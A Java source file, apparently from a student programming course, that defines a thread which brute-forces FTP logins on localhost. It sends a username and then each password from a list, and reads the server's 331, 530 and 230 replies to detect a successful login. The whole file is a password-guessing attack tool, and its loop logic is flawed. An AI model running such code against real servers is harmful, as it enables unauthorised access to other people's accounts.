/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package creackeador;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author alumno
 */
public class HebraCrackeadora extends Thread {

    HebraLectoraCrackeadora hebraLectoraCrackeadora;
    int port = 21;
    Socket canal = null;
    String usuario;
    LinkedList<String> contrasenias;
    LinkedList<String> mensajes;
    FileWriter fw;
    BufferedWriter bw;

    public HebraCrackeadora(String usuario, LinkedList<String> contrasenias) {
        this.usuario = usuario;
        this.contrasenias = contrasenias;
        mensajes = new LinkedList<>();
        try {
            fw = new FileWriter("/home/dam2/Escritorio/raulgmPGV/Creackeador/src/creackeador/pares.txt", true);
            bw = new BufferedWriter(fw);
        } catch (IOException ex) {
        }
    }

    @Override
    public void run() {
        boolean intentoAcertado = false;
        while (contrasenias.size() > 0 || !intentoAcertado) {
            try {
                this.canal = new Socket("localhost", port);
                PrintWriter salida = new PrintWriter(canal.getOutputStream());
                hebraLectoraCrackeadora = new HebraLectoraCrackeadora(mensajes, canal);
                hebraLectoraCrackeadora.start();
                Thread.sleep(100);

                /*while (mensajes.size() > 0) {
                    String txt = mensajes.pop();
                    if (txt.contains("230")) {
                        bw.write("Usuario: " + usuario + " Contrasenia: " + contra);
                        bw.newLine();
                        intentoAcertado = true;
                    }
                    System.out.println(txt);
                }*/
                while (mensajes.size() > 0) {
                    System.out.println(mensajes.pop());
                }
                //String txt = mensajes.pop();
                if (mensajes.size() <= 0) {
                    salida.println("user " + usuario);
                    salida.flush();

                    Thread.sleep(5);

                    if (mensajes.pop().contains("331")) {
                        salida.println("pass " + contrasenias.pop());
                        salida.flush();
                        while (mensajes.size() == 0) {
                            Thread.sleep(100);
                        }
                    }

                    String mensaje = mensajes.pop();
                    if (mensaje.contains("530")) {
                        canal.close();
                    }else if(mensaje.contains("230")){
                        intentoAcertado = true;
                    }
                }
                
                this.canal.close();
                
            } catch (IOException ex) {
                Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InterruptedException ex) {
                Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        for (String mensaje : mensajes) {
            System.out.println(mensaje);
        }

    }

}
